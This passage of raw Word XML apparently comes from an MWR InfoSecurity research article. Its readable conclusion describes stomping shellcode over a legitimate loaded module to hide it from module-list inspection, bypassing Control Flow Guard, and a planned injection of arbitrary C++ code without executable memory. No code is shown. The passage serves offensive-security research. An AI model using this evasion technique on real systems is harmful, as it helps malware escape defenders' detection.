        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B992AF8" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="009B6CAE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E124D81" w14:textId="77777777" w:rsidR="003D7792" w:rsidRPr="00652AAA" w:rsidRDefault="006A0864" w:rsidP="006A0864">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F34066F" w14:textId="31A15C15" w:rsidR="006A0864" w:rsidRPr="00652AAA" w:rsidRDefault="006A0864" w:rsidP="006A0864">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In our voyage so far, we’ve validated </w:t>
      </w:r>
      <w:r w:rsidR="00B6130C" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>this technique</w:t>
      </w:r>
      <w:r w:rsidR="00B6130C" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> will work</w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. We’ve found that an attacker can copy shellcode over a valid module, and in doing so escape the scrutiny of anyone who looks at the process</w:t>
      </w:r>
      <w:r w:rsidR="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>’s</w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> module list. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E7AF7C" w14:textId="0DB7D410" w:rsidR="001D0EBC" w:rsidRPr="00652AAA" w:rsidRDefault="006A0864" w:rsidP="00B939DB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>We’ve also found a way to sidestep CFG, and to call shellcode which takes up to four arguments in the registers</w:t>
      </w:r>
      <w:r w:rsidR="00BD3274" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. This </w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>will come in handy for the next instalment of th</w:t>
      </w:r>
      <w:r w:rsidR="0034651C" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> series. Join us </w:t>
      </w:r>
      <w:r w:rsidR="00B6130C" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>for part two</w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, whe</w:t>
      </w:r>
      <w:r w:rsidR="00B6130C" w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r w:rsidRPr="00652AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> we will further refine our injection to support not just shellcode, but any C++ code, while still avoiding any nasty VirtualProtect or executable memory ranges!</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="001D0EBC" w:rsidRPr="00652AAA" w:rsidSect="00182B85">
      <w:headerReference w:type="default" r:id="rId9"/>
      <w:footerReference w:type="default" r:id="rId10"/>
      <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
      <w:pgMar w:top="1701" w:right="851" w:bottom="1134" w:left="851" w:header="79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36796" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D73" w:rsidP="006774C7">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7769A58E" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D73"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="64EA3D5F" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D73" w:rsidP="006774C7">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="09415A41" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D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A4AA8" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="008C429F" w:rsidRDefault="00386DFA" w:rsidP="008C429F">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:r w:rsidRPr="007D0B82">
      <w:rPr>
        <w:noProof/>
        <w:lang w:eastAsia="en-GB"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251656704" behindDoc="0" locked="0" layoutInCell="0" allowOverlap="1" wp14:anchorId="032F5DE8" wp14:editId="4B32457A">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="page">
                <wp:align>center</wp:align>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>180340</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2351520" cy="160200"/>
              <wp:effectExtent l="0" t="0" r="10795" b="114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1520" cy="160200"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:noFill/>
                      <a:ln w="9525">
                        <a:noFill/>
                        <a:miter lim="800000"/>
                        <a:headEnd/>
                        <a:tailEnd/>
                      </a:ln>
                    </wps:spPr>
                    <wps:txbx>
                      <w:txbxContent>
                        <w:p w14:paraId="6DFB05F5" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="00AB0A90" w:rsidRDefault="001519D4" w:rsidP="00857F72">
                          <w:pPr>
                            <w:pStyle w:val="Classsification"/>
                          </w:pPr>
                          <w:r>
                            <w:fldChar w:fldCharType="begin"/>
                          </w:r>
                          <w:r>
                            <w:instrText xml:space="preserve"> docproperty Classification </w:instrText>
                          </w:r>
                          <w:r>
                            <w:fldChar w:fldCharType="separate"/>
                          </w:r>
                          <w:r w:rsidR="00386DFA">
                            <w:t>SECURITY GROUP PROTECT</w:t>
                          </w:r>
                          <w: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32F5DE8" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
              <v:stroke joinstyle="miter"/>
              <v:path gradientshapeok="t" o:connecttype="rect"/>
            </v:shapetype>
            <v:shape id="Text Box 1" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:14.2pt;width:185.15pt;height:12.6pt;z-index:2516567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" o:allowincell="f" filled="f" stroked="f">
              <v:textbox inset="0,0,0,0">
                <w:txbxContent>
                  <w:p w14:paraId="6DFB05F5" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="00AB0A90" w:rsidRDefault="00386DFA" w:rsidP="00857F72">
                    <w:pPr>
                      <w:pStyle w:val="Classsification"/>
                    </w:pPr>
                    <w:fldSimple w:instr=" docproperty Classification ">
                      <w:r>
                        <w:t>SECURITY GROUP PROTECT</w:t>
                      </w:r>
                    </w:fldSimple>
                  </w:p>
                </w:txbxContent>
              </v:textbox>
              <w10:wrap anchorx="page"/>
            </v:shape>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
    <w:r w:rsidRPr="009057B9">
      <w:t xml:space="preserve">mwrinfosecurity.com | © MWR InfoSecurity </w:t>
    </w:r>
    <w:r w:rsidRPr="007D0B82">
      <w:rPr>
        <w:noProof/>
        <w:lang w:eastAsia="en-GB"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251657728" behindDoc="0" locked="0" layoutInCell="0" allowOverlap="1" wp14:anchorId="62A03C00" wp14:editId="382AC54F">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="margin">
                <wp:align>right</wp:align>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>180340</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="426240" cy="1602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240" cy="160200"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:ln w="9525">
                        <a:noFill/>
                        <a:miter lim="800000"/>
                        <a:headEnd/>
                        <a:tailEnd/>
                      </a:ln>
                    </wps:spPr>
                    <wps:txbx>
                      <w:txbxContent>
                        <w:p w14:paraId="458925D4" w14:textId="4D008582" w:rsidR="00386DFA" w:rsidRPr="003C3F1D" w:rsidRDefault="00386DFA" w:rsidP="008C429F">
                          <w:pPr>
                            <w:pStyle w:val="BodyText"/>
                            <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
                            <w:jc w:val="right"/>
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r w:rsidRPr="003C3F1D">
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                            <w:fldChar w:fldCharType="begin"/>
                          </w:r>
                          <w:r w:rsidRPr="003C3F1D">
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                            <w:instrText xml:space="preserve"> page </w:instrText>
                          </w:r>
                          <w:r w:rsidRPr="003C3F1D">
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                            <w:fldChar w:fldCharType="separate"/>
                          </w:r>
                          <w:r w:rsidR="001519D4">
                            <w:rPr>
                              <w:noProof/>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                            <w:t>1</w:t>
                          </w:r>
                          <w:r w:rsidRPr="003C3F1D">
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>
                            </w:rPr>
                            <w:fldChar w:fldCharType="end"/>
                          </w:r>
                          <w:r w:rsidRPr="003C3F1D">
                            <w:rPr>
                              <w:sz w:val="16"/>
                              <w:szCs w:val="16"/>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A03C00" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
              <v:stroke joinstyle="miter"/>
              <v:path gradientshapeok="t" o:connecttype="rect"/>
            </v:shapetype>
            <v:shape id="Text Box 2" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;margin-left:-17.65pt;margin-top:14.2pt;width:33.55pt;height:12.6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" o:allowincell="f" stroked="f">
              <v:textbox inset="0,0,0,0">
                <w:txbxContent>
                  <w:p w14:paraId="458925D4" w14:textId="4D008582" w:rsidR="00386DFA" w:rsidRPr="003C3F1D" w:rsidRDefault="00386DFA" w:rsidP="008C429F">
                    <w:pPr>
                      <w:pStyle w:val="BodyText"/>
                      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
                      <w:jc w:val="right"/>
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                    </w:pPr>
                    <w:r w:rsidRPr="003C3F1D">
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                      <w:fldChar w:fldCharType="begin"/>
                    </w:r>
                    <w:r w:rsidRPr="003C3F1D">
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                      <w:instrText xml:space="preserve"> page </w:instrText>
                    </w:r>
                    <w:r w:rsidRPr="003C3F1D">
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                      <w:fldChar w:fldCharType="separate"/>
                    </w:r>
                    <w:r w:rsidR="001519D4">
                      <w:rPr>
                        <w:noProof/>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                      <w:t>1</w:t>
                    </w:r>
                    <w:r w:rsidRPr="003C3F1D">
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>
                      </w:rPr>
                      <w:fldChar w:fldCharType="end"/>
                    </w:r>
                    <w:r w:rsidRPr="003C3F1D">
                      <w:rPr>
                        <w:sz w:val="16"/>
                        <w:szCs w:val="16"/>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73D695" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D73">
      <w:r w:rsidRPr="00FC74B6">
        <w:rPr>
          <w:color w:val="1E5272" w:themeColor="text1"/>
        </w:rPr>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="65CE1ED5" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D73" w:rsidP="006774C7">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F81B7BB" w14:textId="77777777" w:rsidR="00F27D73" w:rsidRDefault="00F27D7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03AED" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="00902F3F" w:rsidRDefault="00386DFA" w:rsidP="00CE5451">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:r w:rsidRPr="007D0B82">
      <w:rPr>
        <w:lang w:eastAsia="en-GB"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662848" behindDoc="0" locked="0" layoutInCell="0" allowOverlap="1" wp14:anchorId="3BE8D765" wp14:editId="6E9C1C2C">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="page">
                <wp:posOffset>2596680</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>-635</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2351405" cy="160020"/>
              <wp:effectExtent l="0" t="0" r="10795" b="1143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1405" cy="160020"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:noFill/>
                      <a:ln w="9525">
                        <a:noFill/>
                        <a:miter lim="800000"/>
                        <a:headEnd/>
                        <a:tailEnd/>
                      </a:ln>
                    </wps:spPr>
                    <wps:txbx>
                      <w:txbxContent>
                        <w:p w14:paraId="5BE04476" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="00AB0A90" w:rsidRDefault="001519D4" w:rsidP="00CE5451">
                          <w:pPr>
                            <w:pStyle w:val="Classsification"/>
                          </w:pPr>
                          <w:r>
                            <w:fldChar w:fldCharType="begin"/>
                          </w:r>
                          <w:r>
                            <w:instrText xml:space="preserve"> docproperty Classification </w:instrText>
                          </w:r>
                          <w:r>
                            <w:fldChar w:fldCharType="separate"/>
                          </w:r>
                          <w:r w:rsidR="00386DFA">
                            <w:t>SECURITY GROUP PROTECT</w:t>
                          </w:r>
                          <w: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BE8D765" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
              <v:stroke joinstyle="miter"/>
              <v:path gradientshapeok="t" o:connecttype="rect"/>
            </v:shapetype>
            <v:shape id="Text Box 5" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:204.45pt;margin-top:-.05pt;width:185.15pt;height:12.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" o:allowincell="f" filled="f" stroked="f">
              <v:textbox inset="0,0,0,0">
                <w:txbxContent>
                  <w:p w14:paraId="5BE04476" w14:textId="77777777" w:rsidR="00386DFA" w:rsidRPr="00AB0A90" w:rsidRDefault="00386DFA" w:rsidP="00CE5451">
                    <w:pPr>
                      <w:pStyle w:val="Classsification"/>
                    </w:pPr>
                    <w:fldSimple w:instr=" docproperty Classification ">
                      <w:r>
                        <w:t>SECURITY GROUP PROTECT</w:t>
                      </w:r>
                    </w:fldSimple>
                  </w:p>
                </w:txbxContent>
              </v:textbox>
              <w10:wrap anchorx="page"/>
            </v:shape>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:eastAsia="en-GB"/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75F1C60F" wp14:editId="574813E0">
          <wp:extent cx="1384200" cy="410133"/>
          <wp:effectExtent l="0" t="0" r="6985" b="9525"/>
          <wp:docPr id="3" name="Picture 3" descr="C:\Users\chris_000\AppData\Local\Microsoft\Windows\INetCache\Content.Word\MWR-Info-Logo-Colour-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_000\AppData\Local\Microsoft\Windows\INetCache\Content.Word\MWR-Info-Logo-Colour-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200" cy="41013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E02C5B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276B7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16EA27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2DACFF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632D28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602A7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3"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="81762634"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListBullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="644" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="D94D22" w:themeColor="accent2"/>
        <w:u w:color="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF88"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="C5B08BCC"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="ListNumber"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="360"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="179B3DF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3F81B44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3F8C4E12"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperRoman"/>
      <w:pStyle w:val="AppendixHeading1"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Appendix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0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="(%6)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2FC42F36"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="490CE2DE"/>
    <w:lvl w:ilvl="0" w:tplc="0DFCC516">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:pStyle w:val="Listalpha"/>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03476F1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="77E8934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71277B1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A5D8D428"/>
    <w:styleLink w:val="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hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="(%6)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="456A3BBA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="554CD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D43AEA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="572EFF1C"/>
    <w:lvl w:ilvl="0" w:tplc="D3B42BC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642F45"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A328E46E"/>
    <w:lvl w:ilvl="0" w:tplc="CD2CA012">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListBullet3"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1211" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:color w:val="D94D22" w:themeColor="accent2"/>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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6D1E59A3"/>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FEC71F6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2872F0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CB045B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7638B154"/>
    <w:lvl w:ilvl="0" w:tplc="C9A42444">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListBullet2"/>
      <w:lvlText w:val="–"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="927" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:color w:val="D94D22" w:themeColor="accent2"/>
        <w:u w:color="FFFFFF" w:themeColor="background1"/>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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7B0A0414"/>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E4B617A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="62BC41B8"/>
    <w:lvl w:ilvl="0" w:tplc="8B24852A">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:pStyle w:val="List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2"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="1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Thompson">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="16a9a6b125b42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revisionView w:inkAnnotations="0"/>
  <w:trackRevisions/>
  <w:styleLockTheme/>
  <w:defaultTabStop w:val="720"/>
  <w:drawingGridHorizontalSpacing w:val="6"/>
  <w:drawingGridVerticalSpacing w:val="6"/>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EBC"/>
    <w:rsid w:val="00001CD7"/>
    <w:rsid w:val="000034A6"/>
    <w:rsid w:val="00006886"/>
    <w:rsid w:val="00010985"/>
    <w:rsid w:val="00016A77"/>
    <w:rsid w:val="00016DE1"/>
    <w:rsid w:val="00017742"/>
    <w:rsid w:val="00017F96"/>
    <w:rsid w:val="00020602"/>
    <w:rsid w:val="00031FBB"/>
    <w:rsid w:val="000414C3"/>
    <w:rsid w:val="000425A3"/>
    <w:rsid w:val="00047D8E"/>
    <w:rsid w:val="000503AD"/>
    <w:rsid w:val="000528E7"/>
    <w:rsid w:val="000557E9"/>
    <w:rsid w:val="00056850"/>
    <w:rsid w:val="000670D5"/>
    <w:rsid w:val="000853FE"/>
    <w:rsid w:val="00085EA8"/>
    <w:rsid w:val="000927EB"/>
    <w:rsid w:val="0009403D"/>
    <w:rsid w:val="00095AC1"/>
    <w:rsid w:val="000976CB"/>
    <w:rsid w:val="000A7172"/>
    <w:rsid w:val="000B009B"/>
    <w:rsid w:val="000B05B6"/>
    <w:rsid w:val="000B478B"/>
    <w:rsid w:val="000B4D1D"/>
    <w:rsid w:val="000C3752"/>
    <w:rsid w:val="000C6978"/>
    <w:rsid w:val="000C7132"/>
    <w:rsid w:val="000E2F5D"/>
    <w:rsid w:val="000E3FAE"/>
    <w:rsid w:val="000E503A"/>
    <w:rsid w:val="000F1962"/>
    <w:rsid w:val="000F3047"/>
    <w:rsid w:val="00101082"/>
    <w:rsid w:val="00102000"/>
    <w:rsid w:val="00104881"/>
    <w:rsid w:val="001056DD"/>
    <w:rsid w:val="00114D9B"/>
    <w:rsid w:val="0011536E"/>
    <w:rsid w:val="00120C20"/>
    <w:rsid w:val="00122F73"/>
